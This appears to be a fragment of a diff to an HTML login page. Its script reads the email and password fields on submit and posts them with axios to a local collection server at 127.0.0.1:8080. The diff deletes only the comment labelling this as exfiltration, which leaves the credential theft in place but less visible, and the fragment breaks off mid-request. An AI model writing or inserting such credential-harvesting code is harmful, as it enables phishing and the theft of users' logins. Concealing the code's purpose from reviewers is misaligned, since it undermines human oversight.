@@ -21,11 +21,9 @@ https://www.browserling.com/tools/remove-all-whitespace
 <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
   document.getElementById('loginForm').addEventListener('submit', function(event) {
-    // Get the text from the input fields
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
     
-    // Exfiltrate data with HTTP
     axios.post('http://127.0.0.1:8080', {
         email: email,
         password: password
